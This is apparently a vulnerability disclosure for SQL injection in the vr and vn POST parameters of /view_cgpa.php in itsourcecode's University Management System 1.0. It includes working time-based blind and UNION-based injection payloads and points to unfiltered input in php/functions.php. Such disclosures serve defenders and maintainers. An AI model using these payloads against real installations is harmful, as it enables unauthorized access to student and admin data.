
# Vendor

itsourcecode

# Product

University Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2022/01/University-Management-System-Project-In-PHP-Source-Code.zip

# Description
Register and log in with a admin account, and in the student account's backend, visit "/view_cgpa.php". This page can accept two parameters, VR and VN, both of which can lead to SQL injection attacks.

POC：
---
Parameter: vr (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: vr=123321' AND (SELECT 6610 FROM (SELECT(SLEEP(5)))DIfN) AND 'OIeq'='OIeq&vn=mirage

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: vr=123321' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171706271,0x614b42746d4946444c726d734d695a52654d4a5676534344787557687076666b756f73726b727155,0x7176626271),NULL-- -&vn=mirage
---
<img width="1664" alt="image" src="https://github.com/user-attachments/assets/a38374ae-a71a-4ab7-b742-625fcaa963a8">

# Analysis
In the php/functions.php page, the '$stid' field has not been subjected to strict filtering, resulting in a SQL injection vulnerability.

<img width="1074" alt="image" src="https://github.com/user-attachments/assets/ba124d6c-3ec1-4eef-848b-0f8a2aac248d">
<img width="1229" alt="image" src="https://github.com/user-attachments/assets/40c092f7-4eed-45d0-8e81-88c6bc97a2e3">


